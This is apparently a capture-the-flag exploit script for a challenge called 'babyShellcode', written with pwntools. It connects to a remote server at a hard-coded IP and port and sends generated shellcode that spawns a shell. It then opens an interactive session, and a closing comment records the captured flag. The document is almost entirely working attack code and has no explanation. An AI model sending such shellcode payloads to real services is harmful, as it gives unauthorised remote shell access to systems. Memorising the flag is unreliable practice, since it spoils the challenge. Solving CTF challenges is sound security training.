from pwn import *
elf = context.binary = ELF("./babyShellcode")
p=remote("34.213.62.140",6502)
for i in range(2):
	p.recvline()

sh = asm(shellcraft.sh())
p.sendline(sh)
p.interactive()

#flag{asm_asm_sh3llcr4f7}
